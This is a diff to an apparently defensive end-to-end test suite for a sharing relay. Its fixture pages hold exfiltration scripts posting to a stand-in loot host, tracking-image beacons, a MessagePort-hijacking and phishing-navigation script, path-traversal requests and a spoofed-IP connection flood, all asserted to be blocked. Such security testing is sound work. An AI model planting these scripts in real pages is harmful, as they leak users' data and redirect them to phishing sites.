@@ -131,6 +131,17 @@ async function viewer(link, opts = {}) {
   return { ctx, p, errors }
 }
 const frameOf = (p, has) => until(async () => { const f = p.frames().find((x) => /\/_c\//.test(x.url())); return f && (await f.locator(has).count()) ? f : null }, 20000, 200)
+// A request as what's shared asks it (c: 1, as share.js marks one from its frame): its status.
+async function asContent(v, id, req) {
+  await v.send(K.REQ, id, { h: [], body: false, ...req, c: 1 })
+  let head = null
+  for (;;) {
+    const r = await v.next()
+    if (r.id !== id) continue
+    if (r.kind === K.HEAD) head = JSON.parse(Buffer.from(r.body).toString('utf8'))
+    else if (r.kind === K.END || r.kind === K.ERR) return head?.s ?? 'error'
+  }
+}
 const codeIn = async (email) => { const m = (await accounts.mail()).filter((x) => x.to === email).at(-1); return /\b(\d{8})\b/.exec(m?.text || '')?.[1] || null }
 
 try {
@@ -157,7 +168,7 @@ try {
   await part('a file', async () => {
     const dir = path.join(home, 'report')
     fs.mkdirSync(dir, { recursive: true })
-    fs.writeFileSync(path.join(dir, 'report.html'), `<!doctype html><title>Report</title><h1 id="r">Quarterly report MARKER-FILE</h1><p id="js">no script</p><a id="next" href="notes.html">notes</a><script>document.getElementById('js').textContent = 'ran'; fetch('${EX}/loot-file', { method: 'POST', mode: 'no-cors', body: String(top.location.href) }).catch(() => {})</script>`)
+    fs.writeFileSync(path.join(dir, 'report.html'), `<!doctype html><title>Report</title><h1 id="r">Quarterly report MARKER-FILE</h1><p id="js">no script</p><a id="next" href="notes.html">notes</a><img src="${EX}/loot-file-img"><script>document.getElementById('js').textContent = 'ran'; fetch('${EX}/loot-file', { method: 'POST', mode: 'no-cors', body: String(top.location.href) }).catch(() => {})</script>`)
     fs.writeFileSync(path.join(dir, 'notes.html'), 'notes')
     const s = await share({ kind: 'file', root: 'home', path: 'report/report.html' })
     ok(new RegExp(`^${relay.shareUrl}/v/[\\w-]{22}#s=[\\w-]{43}&n=Tester$`).test(s.link) && /<svg/.test(s.qr || '') && s.scripts === false, 'a link at the relay\'s share address (never the phone page\'s), its secret in the fragment, with a QR code; on a relay of your own, what it shows runs no scripts', s.link)
@@ -174,6 +185,7 @@ try {
     ok(!!fr && /MARKER-FILE/.test(await fr.locator('#r').innerText()), 'in a browser: it shows', fr?.url())
     await sleep(800)
     ok((await fr.locator('#js').innerText()) === 'no script' && !loot.some((x) => x.path === '/loot-file'), 'its scripts never run, so it can\'t reach the page around it, nor send anything anywhere')
+    ok(!loot.some((x) => x.path === '/loot-file-img'), 'nor does it load anything from another site (a picture there would say it was opened)')
     const at = new URL(p.url())
     ok(!at.hash && !p.url().includes(secretOf(s.link)) && /^\/v\/[\w-]{22}$/.test(at.pathname) && (await p.evaluate(() => sessionStorage.length + localStorage.length)) === 0, 'the link\'s secret leaves the address at once, and nothing is kept in the browser', p.url())
     ok((await p.locator('#top-title').innerText()) === 'report.html' && /Tester/.test(await p.locator('#top-who').innerText()), 'with what it is and who shares it above it')
@@ -270,7 +282,32 @@ try {
     await v.send(K.WS_OPEN, wsId, { u: '/api/events' })
     const closed = await until(async () => { const r = await v.next(3000); return r.kind === K.WS_CLOSE && r.id === wsId ? r : null }, 6000, 0)
     ok(!!closed, 'nor a socket to it', closed)
+    const asked = [await asContent(v, 80, { m: 'GET', u: '/.share/about' }), await asContent(v, 81, { m: 'GET', u: '/c/../.share/about' }), await asContent(v, 82, { m: 'POST', u: '/.share/password' }), (await v.request('GET', '/c/../.share/about')).status, await asContent(v, 83, { m: 'GET', u: '/c/notes.txt' })]
+    ok(asked.slice(0, 4).every((s) => s === 404) && asked[4] === 200, 'what\'s shown never asks the page\'s own questions (/.share/), however the path is written; only what\'s shared', asked)
     v.close()
+  })
+
+  // ---------- a page waiting for its password keeps its place ----------
+  await part('pages waiting at the relay', async () => {
+    const s = await share({ kind: 'file', root: 'home', path: 'outside.txt', password: 'right-pass-77' })
+    const v = await viewAs(s.link, { headers: { 'CF-Connecting-IP': '203.0.113.9' } })
+    await v.request('GET', '/.share/about')
+    const ws = []
+    for (let i = 0; i < 60; i++) {
+      const w = new WebSocket(`${relay.shareUrl.replace(/^http/, 'ws')}/_relay/view`, { headers: { 'CF-Connecting-IP': i % 2 ? '198.51.100.7' : `198.51.100.${10 + i}` } })
+      w.on('error', () => {})
+      ws.push(w)
+      await sleep(10)
+    }
+    await sleep(1500)
+    const fromOne = ws.filter((w, i) => i % 2 && w.readyState === 1).length
+    const open = ws.filter((w) => w.readyState === 1).length
+    const r = await v.request('POST', '/.share/password', { password: 'right-pass-77' })
+    ok(r.status === 200 && !v.closed && /OUTSIDE-SECRET/.test((await v.request('GET', '/c/outside.txt')).text || ''), 'a page at the password screen keeps its place while many connect to the share address without a word', { status: r.status, closed: v.closed })
+    ok(fromOne <= 4 && open <= 16, 'those that haven\'t proved a link wait in a small room of their own: 4 from one address, 16 in all, the oldest making room', { fromOne, open })
+    for (const w of ws) w.terminate()
+    v.close()
+    await kit.api(`/shares/${s.id}/stop`, {})
   })
 
   // ---------- the relay never sees what's shown ----------
@@ -430,6 +467,17 @@ try {
     const listed = (await kit.api('/shares')).shares.find((x) => x.id === s.id)
     ok(listed.opens.some((o) => o.what === 'opened' && o.email === 'ana@example.com') && listed.opens.some((o) => o.what === 'not on the list' && o.email === 'eve@example.com') && listed.opens.some((o) => o.what === 'wrong code'), 'Settings › Sharing has which email opened it, and the tries', listed.opens)
     await kit.api(`/shares/${s.id}/stop`, {})
+    await sleep(500)
+    const forgot = await until(async () => { const r = await accounts.call('POST', '/v1/share-code', { link: s.id, to: 'ana@example.com', code: '12345678' }, token); return r.code === 'not-named' ? r : null }, 8000)
+    ok(!!forgot, 'stopped: the accounts service forgets who the link named, and sends no more codes for it', forgot)
+    // An account names people for so many links at once, and says so only so often.
+    const fake = (i) => `fake${String(i).padStart(4, '0')}${'x'.repeat(14)}`
+    let capped = null
+    for (let i = 0; i < 55 && !capped; i++) { const r = await accounts.call('POST', '/v1/share-people', { link: fake(i), emails: ['someone@example.com'], until: Date.now() + 3600000 }, token); if (r.status !== 200) capped = { i, ...r } }
+    ok(capped?.code === 'too-many' && capped.i === 50 && /50 links naming people/.test(capped.error || ''), 'the accounts service keeps people for 50 links of an account at once', capped)
+    let slowed = null
+    for (let i = 0; i < 20 && !slowed; i++) { const r = await accounts.call('POST', '/v1/share-people', { link: fake(i), emails: [] }, token); if (r.status !== 200) slowed = r }
+    ok(slowed?.code === 'too-many' && /in the last hour/.test(slowed.error || ''), 'and is told which people only 60 times an hour', slowed)
   })
 
   // ---------- a Studio document, live ----------
@@ -649,6 +697,17 @@ try {
       for (const f of [() => top.location.href, () => parent.parent.location.href, () => top.sessionStorage.length, () => top.document.title]) { try { got.push(String(f())) } catch { got.push('blocked') } }
       document.getElementById('probe').textContent = got.join('|')
       fetch('${EX}/loot-site', { method: 'POST', body: got.join('|') }).then(() => { document.getElementById('probe').dataset.sent = 'yes' }, () => { document.getElementById('probe').dataset.sent = 'no' })
+      new Image().src = '${EX}/loot-site-img'
+    </script>`)
+    fs.writeFileSync(path.join(site, 'reach.html'), `<!doctype html><title>Reach</title><p id="cap">?</p><button id="top">Go</button><script>
+      const P = parent
+      let cap = null
+      const orig = P.MessagePort.prototype.postMessage
+      P.MessagePort.prototype.postMessage = function (...a) { cap = this; return orig.apply(this, a) }
+      fetch('css/a.css').catch(() => {}).finally(() => { P.MessagePort.prototype.postMessage = orig; document.getElementById('cap').textContent = cap ? 'captured' : 'not captured' })
+      const away = (to) => { try { const a = P.document.createElement('a'); a.href = '${EX}' + to; a.target = '_top'; P.document.body.appendChild(a); a.click() } catch {} }
+      setTimeout(() => away('/phish-noclick'), 300)
+      document.getElementById('top').onclick = () => { away('/phish-click'); try { P.open('${EX}/phish-open', '_top') } catch {} try { top.location = '${EX}/phish-location' } catch {} }
     </script>`)
     fs.writeFileSync(path.join(site, 'css', 'a.css'), 'h1 { color: rgb(255, 0, 0) }')
     fs.writeFileSync(path.join(site, 'css', 'abs.css'), '#p { color: rgb(0, 0, 255) }')
@@ -667,13 +726,27 @@ try {
     const probe = await until(async () => { const x = await fr.locator('#probe').innerText(); return x !== '?' && (await fr.locator('#probe').getAttribute('data-sent')) ? x : null }, 8000)
     ok(probe === 'blocked|blocked|blocked|blocked', 'its scripts run, but can\'t reach the page holding the link (its address, its storage, its page)', probe)
     ok((await fr.locator('#probe').getAttribute('data-sent')) === 'no' && !loot.some((x) => x.path === '/loot-site'), '...nor send anything anywhere but its own address (connect-src \'self\')')
+    ok(!loot.some((x) => x.path === '/loot-site-img'), '...nor load anything from another site (default-src \'self\'): a picture from elsewhere never loads')
     ok(!new URL(p.url()).hash && !p.url().includes(secretOf(s.link)), 'and the link\'s secret is out of the address')
     await fr.click('#go')
     const sub = await until(async () => { const f = p.frames().find((x) => /\/sub\/page\.html$/.test(x.url())); return f && (await f.locator('#s').count()) ? f : null }, 10000, 200)
     ok(!!sub, 'a link to another page of it')
     await sub.click('#abs')
-    ok(!!(await until(async () => { const f = p.frames().find((x) => /\/_c\/[\w-]+\/index\.html$/.test(x.url())); return f && (await f.locator('#h').count()) }, 10000, 200)), 'and an absolute link back, under the link')
-    ok(!errors.length, 'no page errors', errors)
+    const home2 = await until(async () => { const f = p.frames().find((x) => /\/_c\/[\w-]+\/index\.html$/.test(x.url())); return f && (await f.locator('#h').count()) ? f : null }, 10000, 200)
+    ok(!!home2, 'and an absolute link back, under the link')
+    // A page of it reaching into the page around it (its own address too): for the link's port, and
+    // for this tab, with a click and without.
+    const sandbox = await p.locator('#view').getAttribute('sandbox')
+    ok(!!sandbox && !/allow-top-navigation/.test(sandbox), 'what\'s shown is in a frame that can\'t take the tab anywhere', sandbox)
+    await home2.evaluate(() => { location.href = 'reach.html' })
+    const reach = await until(async () => { const f = p.frames().find((x) => /\/reach\.html$/.test(x.url())); return f && (await f.locator('#cap').innerText().catch(() => '?')) !== '?' ? f : null }, 10000, 200)
+    await sleep(800)
+    await reach?.click('#top').catch(() => {})
+    await sleep(1500)
+    ok((await reach?.locator('#cap').innerText()) === 'not captured', 'reaching into the page around it, it never gets the port to the link\'s page')
+    ok(new URL(p.url()).host === v1.host && !!(await p.locator('#view').count()), 'and never takes the tab anywhere, with a click or without', p.url())
+    // (WebKit reports each navigation of the tab it stopped as an error of the page.)
+    ok(!errors.filter((e) => !/sandboxed/.test(e)).length, 'no page errors', errors)
     await shot(p, `${tag}share-site`)
     // A page of what's shared opened on its own (a window, another site's link): nothing.
     const lone = await ctx.newPage()
@@ -699,6 +772,23 @@ try {
     ok(!!sv.closed && (await hk.api('/relay')).online && !(await hk.api('/relay')).limit, 'a page that hasn\'t given the password and sends too much is let go, and the computer and its phones carry on', { sent, closed: sv.closed })
     sv.close()
     await hk.api(`/shares/${s.id}/stop`, {})
+  })
+
+  await part('Bridge AI\'s relay: links\' allowance, and codes per account', async () => {
+    const caps = (await hk.api('/shares')).relay
+    ok(caps?.window === 60000 && caps.week === 250000 && caps.linkWeek === 100000 && caps.perSecond === 50, 'Bridge AI\'s relay says what links may carry there, apart from the phones', caps)
+    const d = await page(b, hk.url)
+    await d.p.waitForSelector('.rail-nav-btn', { timeout: 20000 })
+    await d.p.evaluate(() => window.dispatchEvent(new CustomEvent('bridge-open-settings', { detail: { section: 'sharing' } })))
+    const said = await until(async () => { const x = await d.p.locator('.share-relay-limits').innerText().catch(() => ''); return x || null }, 10000)
+    ok(/60,000 messages in 8 hours and 250,000 a week/.test(said || ''), 'Settings › Sharing says it', said)
+    await d.ctx.close()
+    // Kim's links get their own codes to an address another account has used up (bo@example.com).
+    const token = JSON.parse(fs.readFileSync(path.join(hk.data, 'account.json'), 'utf8')).deviceToken
+    const link = `kimlink${'y'.repeat(15)}`
+    await accounts.call('POST', '/v1/share-people', { link, emails: ['bo@example.com'], until: Date.now() + 3600000 }, token)
+    const sent = await accounts.call('POST', '/v1/share-code', { link, to: 'bo@example.com', code: '87654321' }, token)
+    ok(sent.status === 200 && (await accounts.mail()).some((m) => m.to === 'bo@example.com' && /kim@example\.com/.test(m.subject)), 'one account using up its codes to an address leaves another\'s', sent)
   })
 
   await part('Bridge AI\'s relay: an agent\'s app', async () => {
